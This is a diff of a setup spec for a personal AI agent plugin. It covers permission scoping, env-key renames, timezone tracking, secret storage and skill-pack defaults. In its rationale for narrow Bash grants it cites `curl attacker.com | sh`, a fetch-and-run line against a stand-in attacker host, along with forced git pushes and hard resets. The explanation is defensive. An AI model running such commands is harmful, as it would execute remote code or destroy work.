`Skill(agent-kevin:upgrade)`, and `Skill(agent-kevin:release)` are **latent**: all currently set `disable-model-invocation` (slash-only — `/plan-spec`, `/simple-simplify`, `/upgrade`, `/release`), so the grant does nothing until that flag is dropped; they're kept here so the slash invocation never prompts. `upgrade` applies pending HOME migrations after a `/plugin update`; `release` (producer-only) cuts a versioned release + CHANGELOG entry.
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
@@ -749,7 +849,8 @@ Kevin reads this every session (via `@-import` in `CLAUDE.md`). The headline of 
 ## Identity
 
 - **Name:** <NAME>
-- **Timezone:** <TIMEZONE>
+- **Home timezone:** <TIMEZONE>
+- **Current timezone:** read it from the session context's `## Today` line; it follows the machine clock, so it tracks travel. When that line flags traveling, use the current zone for "now" and scheduling, and keep home-anchored deadlines in the home zone.
 
 ## How to Talk to Me
 
@@ -765,7 +866,7 @@ _(Anything Kevin should respect about your personal values, ethics, taboos, or h
 
 ## Where Things Live
 
-- **Primary codebase:** `<KEVIN_CODE_PATH>` (also exposed as `$KEVIN_CODE_PATH` for shell/MCP use)
+- **Primary codebase:** `<AGENT_CODE_PATH>` (also exposed as `$AGENT_CODE_PATH` for shell/MCP use)
 
 ## Deeper
 
@@ -778,7 +879,7 @@ These files hold my evolving long-form knowledge. Kevin reads them on demand and
 - [Interests](knowledge/user/interests.md)
 ```
 
-If Step 4b returned `skip`, omit the `## Where Things Live` section entirely — Kevin's a personal agent and many operators have no primary codebase, so an empty placeholder is just noise. The operator can add it later by setting `env.KEVIN_CODE_PATH` and re-running compile.
+If Step 4b returned `skip`, omit the `## Where Things Live` section entirely — Kevin's a personal agent and many operators have no primary codebase, so an empty placeholder is just noise. The operator can add it later by setting `env.AGENT_CODE_PATH` and re-running compile.
 
 `<AVATAR_LINE>` rendering:
 - If Step 5b staged a user avatar at `<KNOWLEDGE_ROOT>/user/assets/avatar.<ext>` → render `![Avatar](knowledge/user/assets/avatar.<ext>)` (path relative to `<HOME_DIR>`, since CLAUDE.md `@-imports` USER.md from there).
@@ -847,6 +948,7 @@ updated: <YYYY-MM-DD>
 - **Never mark a task complete** without proving it works (tests pass, feature verified, change reviewed).
 - **For UI / frontend changes**, exercise the feature in a browser before reporting done. Type checks verify code correctness, not feature correctness.
 - If something goes sideways mid-task, stop and re-plan instead of pushing through.
+- **When a built-in tool reports a missing dependency, relay its install hint and stop.** Don't improvise a fragile fallback. Example: the Read tool renders PDFs via poppler's `pdftoppm`; if it's absent, tell the operator to run `brew install poppler` instead of reaching for `pdftotext`, a Python lib, or manual transcription.
 
 ## Engineering Defaults
 
@@ -867,26 +969,42 @@ _(Add anything Kevin should never do — sensitive content, off-limits topics, v
 
 If Step 5 URL synthesis surfaced anything that contradicts these defaults (e.g., the user's blog reveals they prefer step-by-step walkthroughs over terse answers), append a `## Synthesized from URLs` section below the defaults rather than overwriting them — let the user resolve the conflict later.
 
-Also write `.claude/settings.local.json` so the file exists with the correct gitignored permissions from day one. The only env keys init owns are the **optional** primary-codebase pair from Step 4b — and only when a path was actually captured.
+Also write `.claude/settings.local.json` so the file exists with the correct gitignored permissions from day one. The env keys init owns are `AGENT_HOME_TIMEZONE` from Step 4 (always written — the SessionStart hook compares it against the live machine timezone and flags the operator as traveling when they differ) and the **optional** primary-codebase pair from Step 4b, written only when a path was actually captured.
 
-**Secrets live in `.kevin/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `KEVIN_DB_*`) go in the deny-gated `.kevin/secrets/.env` — `/agent-kevin:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, `google-search-audit`) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.kevin/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.
+**Secrets live in `.kevin/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `AGENT_DB_*`) go in the deny-gated `.kevin/secrets/.env` — `/agent-kevin:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, `google-search-audit`) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.kevin/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.
 
-The rule: **init owns env keys that are universal to every operator; configure-skills owns pack-gated env keys.** Kevin's only universal-infra keys are the optional codebase pair, so:
+Env spelling: HOME-scoped keys are written under their shared, agent-neutral `AGENT_*` names — the file's location already scopes them to this agent, and the HOME stays portable. The agent's own prefix (`KEVIN_*`) is a valid override everywhere and always wins; it's required only in machine-wide `~/.claude/settings.json`, where the prefix is what keeps one agent's value from reaching every agent on the box (which is why `KEVIN_HOME` keeps it).
 
-- **Step 4b captured a real path:** write `KEVIN_CODE_PATH` and derive `KEVIN_GIT_REPOS` to the same path (it surfaces that repo's recent git activity in the SessionStart `## Recent Git Activity` block — operators can append more later, `,/path/to/other/repo`, without touching plugin code).
+The rule: **init owns env keys that are universal to every operator; configure-skills owns pack-gated env keys.** Kevin's universal-infra keys are `AGENT_HOME_TIMEZONE` and the optional codebase pair, so:
+
+- **Step 4b captured a real path:** write `AGENT_CODE_PATH` and derive `AGENT_GIT_REPOS` by enumerating the main-checkout git repos beside it — one level under the code root, `.git` **directory** only so sibling worktrees (whose `.git` is a pointer file) don't flood the list (it surfaces those repos' recent git activity in the SessionStart `## Recent Git Activity` block, and where-am-i's session radar scopes by the code root too — operators can append more later, `,/path/to/other/repo`, without touching plugin code).
+
+  ```bash
+  GIT_REPOS=""
+  if [ -n "$AGENT_CODE_PATH" ]; then
+    CODE_ROOT=$(dirname "$AGENT_CODE_PATH")
+    for repo in "$CODE_ROOT"/*/; do
+      [ -d "$repo/.git" ] && GIT_REPOS="${GIT_REPOS:+$GIT_REPOS,}${repo%/}"
+    done
+    GIT_REPOS="${GIT_REPOS:-$AGENT_CODE_PATH}"
+  fi
+  ```
+
+  Show the derived list to the operator before writing — one line, e.g. *"Git activity will cover: `<GIT_REPOS>` — trim any you don't want in your session context."* — and honour any trim they reply with.
 
   ```json
   {
     "env": {
-      "KEVIN_CODE_PATH": "<KEVIN_CODE_PATH>",
-      "KEVIN_GIT_REPOS": "<KEVIN_CODE_PATH>"
+      "AGENT_HOME_TIMEZONE": "<TIMEZONE>",
+      "AGENT_CODE_PATH": "<AGENT_CODE_PATH>",
+      "AGENT_GIT_REPOS": "<GIT_REPOS>"
     }
   }
   ```
 
-- **Step 4b returned `skip`:** write `{}` — no orphan empty keys. A code path is genuinely optional for a personal agent; the operator can add it later by editing this file.
+- **Step 4b returned `skip`:** write only `AGENT_HOME_TIMEZONE` — no orphan empty keys. A code path is genuinely optional for a personal agent; the operator can add it later by editing this file.
 
-- **If the file already exists:** never overwrite existing values. Merge in the codebase pair only if (a) Step 4b captured a real path AND (b) `env.KEVIN_CODE_PATH` / `env.KEVIN_GIT_REPOS` are currently absent or the empty string. Leave all other keys untouched. configure-skills walks merge in pack-gated keys via §D when activated.
+- **If the file already exists:** never overwrite existing values. Merge in `AGENT_HOME_TIMEZONE` if absent, and the codebase pair only if (a) Step 4b captured a real path AND (b) `env.AGENT_CODE_PATH` / `env.AGENT_GIT_REPOS` are currently absent or the empty string. Leave all other keys untouched. configure-skills walks merge in pack-gated keys via §D when activated.
 
 We intentionally do **not** prompt for any secret values in chat (see the rule below); the codebase path is not a secret — it's captured in Step 4b's plain-chat prompt.
 
@@ -1026,10 +1144,12 @@ The scaffold is done. Before showing the final confirmation, offer to wire up AP
 > - ☐ SEO pack (serpapi · open-page-rank · GSC · page-speed · WP · search-audit)
 > - ☑ Browser pack **(recommended)** (perplexity search + browser screenshot/pdf/record + browser-flows)
 > - ☐ Database pack (connect Kevin to one or more Postgres databases — read-only `database_list`/`database_schema`/`database_query` + `database_fork` to clone a local DB for risky schema work)
-> - ☐ GitHub pack (read-only PR, issue + GitHub Actions access — `github_pr_*` / `github_issue_*` / `github_run_*` — to review PRs/issues and diagnose failing CI builds)
+> - ☐ GitHub pack **(recommended when you gave a code path)** (read-only PR, issue + GitHub Actions access — `github_pr_*` / `github_issue_*` / `github_run_*` — to review PRs/issues and diagnose failing CI builds, plus `github_fast_forward`, which is what keeps your checkouts current on every `/agent-kevin:sync`; needs `GITHUB_TOKEN` **and** the `gh` CLI)
 > - ☐ Third-party libraries (aaron-he-zhu SEO/GEO skills, coreyhaines31 marketing playbooks, others)
 
 Default-select **Browser** (recommended — Playwright's capture tools work immediately with no key, and Perplexity just waits on a key). Leave the others unticked; the user ticks any they want.
+
+**Also default-tick GitHub when Step 4b captured a real code path.** `github_fast_forward` is what keeps those checkouts current during `/agent-kevin:sync`, and it needs `GITHUB_TOKEN`; without the pack it returns `NOT_CONFIGURED` and the operator's code silently never refreshes — the one failure mode that degrades *answers* rather than surfacing an error, since Kevin keeps grounding confidently against a frozen checkout. An operator who just told init where their code lives has effectively asked for this. Leave it unticked when Step 4b returned `skip` (no checkout, nothing to fast-forward — the common case for a Kevin home). Either way it stays a tick the operator can clear.
 
 Behavior on the response:
 - **Each ticked option**: run the matching configure-skills section in order — SEO (A.2a) → Browser (A.2b) → Database (A.2c) → GitHub (A.2d) → Third-party (F). The walks **never prompt for API key values or connection strings in chat** — they add MCP grants to `settings.json`, plant the `GSC_SITE_URL` placeholder, and ensure `.kevin/secrets/.env` exists. The user adds the secret lines + values via their editor after relaunch.
@@ -1071,7 +1191,7 @@ Blank line, then the status block as plain prose (one row per line, two-space gu
 
 For `<SKILL_PACK_ROW>`, render the row based on what Step 8 did. Note: "activated" here means permissions granted + `.kevin/secrets/.env` ensured (and the `GSC_SITE_URL` placeholder planted), not key values — those come from the user editing `.kevin/secrets/.env` (secrets) and `settings.local.json` (`GSC_SITE_URL`).
 - If user skipped Step 8 entirely → `⏳ Skill packs   none activated — run /agent-kevin:configure-skills later`
-- If user activated any pack → `✅ Skill packs   <list, e.g. "SEO (perms granted; fill SERPAPI_KEY + OPENPAGERANK_API_KEY in .kevin/secrets/.env, GSC_SITE_URL in settings.local.json), Browser (perms granted; fill PERPLEXITY_API_KEY in .kevin/secrets/.env), Database (perms granted; fill KEVIN_DB_<NAME> in .kevin/secrets/.env), GitHub (perms granted; fill GITHUB_TOKEN in .kevin/secrets/.env)">`
+- If user activated any pack → `✅ Skill packs   <list, e.g. "SEO (perms granted; fill SERPAPI_KEY + OPENPAGERANK_API_KEY in .kevin/secrets/.env, GSC_SITE_URL in settings.local.json), Browser (perms granted; fill PERPLEXITY_API_KEY in .kevin/secrets/.env), Database (perms granted; fill AGENT_DB_<NAME> in .kevin/secrets/.env), GitHub (perms granted; fill GITHUB_TOKEN in .kevin/secrets/.env)">`
 
 Use ✅ for what landed and ⏳ for deferred (the hourglass implies "queued for later"). Don't list `<FACET_FILES_FILLED>/5` if Step 5 was skipped — just say "stubs only" instead.
 
@@ -1089,9 +1209,9 @@ Blank line, then the **Next** heading (same style as Ready), then the relaunch p
 >   - `PERPLEXITY_API_KEY` — Browser pack (sign up at https://perplexity.ai/settings/api)
 >   - `SERPAPI_KEY` — SEO pack (https://serpapi.com)
 >   - `OPENPAGERANK_API_KEY` — SEO pack (https://openpagerank.com)
->   - `KEVIN_DB_<NAME>` — Database pack: one Postgres connection string per line
+>   - `AGENT_DB_<NAME>` — Database pack: one Postgres connection string per line
 >   - `GITHUB_TOKEN` — GitHub pack: a fine-grained, read-only PAT (PRs·Issues·Metadata·Checks·Actions — NOT Workflows). Needs the `gh` CLI on PATH (`brew install gh`).
-> - **Private config → `<HOME_DIR>/.claude/settings.local.json`** `env`: init wrote `KEVIN_CODE_PATH` / `KEVIN_GIT_REPOS` if you gave a codebase path at Step 4b (else `{}`). Set `GSC_SITE_URL` here (your Search Console property — not a secret, and Bash-based SEO skills read it from here) before running `mcp__plugin_agent-kevin_kevin__google_auth`. For Google, drop the OAuth client JSON at `<HOME_DIR>/.kevin/secrets/google/google-oauth-client.json`.
+> - **Private config → `<HOME_DIR>/.claude/settings.local.json`** `env`: init wrote `AGENT_HOME_TIMEZONE` (your home base — sessions flag traveling when the machine timezone differs), plus `AGENT_CODE_PATH` / `AGENT_GIT_REPOS` if you gave a codebase path at Step 4b. Set `GSC_SITE_URL` here (your Search Console property — not a secret, and Bash-based SEO skills read it from here) before running `mcp__plugin_agent-kevin_kevin__google_auth`. For Google, drop the OAuth client JSON at `<HOME_DIR>/.kevin/secrets/google/google-oauth-client.json`.
 >
 > Didn't tick a pack at Step 8? Run `/agent-kevin:configure-skills` later — it adds permissions, ensures `.kevin/secrets/.env` exists, and tells you the lines to add via your editor. Tools whose key is missing stay loaded but return "missing env var" if called — add the line any time later and the next session picks it up.
 >
